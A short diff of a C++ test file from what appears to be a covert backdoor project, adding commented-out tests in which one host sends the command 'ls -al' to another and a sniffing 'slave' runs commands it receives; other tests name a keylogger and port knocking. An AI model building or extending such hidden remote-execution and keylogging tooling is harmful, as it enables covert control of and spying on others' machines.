@@ -6,6 +6,7 @@
 
 #include "Crypto.h"
 #include "NetworkEngine.h"
+#include "RemoteCodeExecuter.h"
 #include "TcpStack.h"
 #include "UdpStack.h"
 #include "authenticator.h"
@@ -89,13 +90,34 @@ void testKnock() {
     netEngine.stopSniff();
 }
 
+/*
+void testRceMaster() {
+    struct in_addr daddr;
+    daddr.s_addr = 0xc0a80012;
+
+    NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
+
+    RemoteCodeExecuter::sendCommand(&netEngine, daddr, "ls -al");
+}
+
+void testRceSlave() {
+    NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
+
+    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
+
+    netEngine.startSniff("ip and tcp");
+    sleep(30);
+    netEngine.stopSniff();
+}
+*/
+
 int main(int argc, char *argv[]) {
 
     // testAuth();
     // testCrypto();
     // testKeylogger();
     // testNet();
-    testKnock();
+    // testKnock();
 
     return 0;
 }
